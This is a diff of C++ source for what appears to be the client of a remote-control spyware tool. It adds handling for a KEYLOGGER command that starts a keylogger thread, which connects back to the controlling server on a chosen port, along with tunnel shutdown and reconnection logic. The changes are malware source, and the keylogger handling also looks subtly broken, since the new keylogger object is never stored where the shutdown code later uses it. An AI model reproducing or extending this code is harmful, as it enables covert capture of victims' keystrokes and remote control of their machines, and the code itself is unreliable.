@@ -20,6 +20,14 @@ int Client::is_valid_tunnel(CommandCode __tunnel_code) {
     return -1;
 }
 
+CLTunnel* Client::get_cltunnel(CommandCode __tunnel_code) {
+    if (is_valid_tunnel(__tunnel_code) == 0) {
+        printf("[Client::get_cltunnel] index: %d\n", (int) (log(__tunnel_code)/log(2)) - 2);
+        return &cltunnels_[(int) (log(__tunnel_code)/log(2)) - 2];
+    }
+    return nullptr;
+}
+
 int Client::init() {
     memset(&server_addr_, 0, sizeof(server_addr_));
     server_addr_.sin_family = AF_INET;
@@ -98,17 +106,79 @@ void Client::start() {
                 shutdown_flag_ = true;
                 break;
             } else if (is_valid_tunnel(command_code) == 0) {
-                
+                CLTunnel* tunnel = get_cltunnel(command_code);
+
+                if (tunnel == nullptr) {
+                    printf("[Client] Invalid tunnel code\n");
+                    continue;
+                }
+
+                if (command_arg > 0) {
+                    // Create a tunnel object with the appropriate type                    
+                    if (tunnel->thread_running_) {
+                        printf("[Client] Tunnel already running\n");
+                        send_out(socket_, EXEC_ERROR);
+                        continue;
+                    }
+                    
+                    CLSpyTunnel* clspy_tunnel = tunnel->clspy_tunnel_;
+                    if (command_code == KEYLOGGER) {
+                        printf("[Client] Received KEYLOGGER command. Port: %d\n", command_arg+port_);
+                        clspy_tunnel = new CLKeylogger();
+                        rc = clspy_tunnel->init(ip_, port_ + command_arg, TCP_BASED);
+                        if (rc < 0) {
+                            delete clspy_tunnel;
+                            clspy_tunnel = nullptr;
+                            send_out(socket_, EXEC_ERROR);
+                            continue;
+                        }
+                    }
+
+                    rc = pthread_create(&tunnel->thread, NULL, cltunnel_helper, (void*)tunnel);
+                    if (rc != 0) {
+                        printf("[Client] Error creating thread: %s\n", strerror(rc));
+                        delete clspy_tunnel;
+                        clspy_tunnel = nullptr;
+                        send_out(socket_, EXEC_ERROR);
+                        continue;
+                    }
+
+                    tunnel->thread_running_ = true;
+                } else if (command_arg == 0) {
+                    if (tunnel->thread_running_) {
+                        printf("[Client] Received shutdown command for tunnel\n");
+                        tunnel->clspy_tunnel_->tunnel_shutdown_flag_ = true;
+                        pthread_join(tunnel->thread, NULL);
+                        tunnel->thread_running_ = false;
+                        delete tunnel->clspy_tunnel_;
+                        tunnel->clspy_tunnel_ = nullptr;
+                        send_out(socket_, EXEC_SUCCESS);
+                    } else {
+                        printf("[Client] Tunnel not running\n");
+                        send_out(socket_, EXEC_ERROR);
+                    }
+                }
             }
         }
         retry:
             if (!shutdown_flag_) {
-                sleep(1);
                 if (socket_ >= 0) {
                     close(socket_);
                     socket_ = -1;
                 }
             }
+
+            for (int i=0; i<TUNNEL_NUMS; i++) {
+                if (cltunnels_[i].thread_running_) {
+                    cltunnels_[i].clspy_tunnel_->tunnel_shutdown_flag_ = true;
+                }
+                if (cltunnels_[i].thread_running_) {
+                    pthread_join(cltunnels_[i].thread, NULL);
+                }
+            }
+
+            sleep(1);
+            printf("[Client] Retrying connection...\n");
     }
 }
 
